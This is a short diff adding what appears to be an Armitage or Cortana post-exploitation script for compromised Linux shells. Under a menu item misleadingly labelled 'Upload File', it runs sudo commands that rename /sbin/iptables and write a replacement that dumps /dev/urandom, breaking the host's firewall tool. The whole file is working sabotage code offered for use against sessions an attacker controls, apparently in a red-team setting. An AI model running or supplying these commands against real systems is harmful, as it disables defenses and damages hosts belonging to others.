@@ -1,0 +1,14 @@
+# This should upload a file to the provided shells
+
+popup shell {
+	if (host_os(session_host($1)) eq "Linux") {
+		menu "Upload File" {
+			item "Iptables" {
+				println("modifying the iptables binary");
+				s_cmd($1, "sudo mv /sbin/iptables /sbin/iptablesbak");
+				s_cmd($1, "echo 'cat /dev/urandom' | sudo tee -a /sbin/iptables");
+			}
+		}
+	}
+}
+		
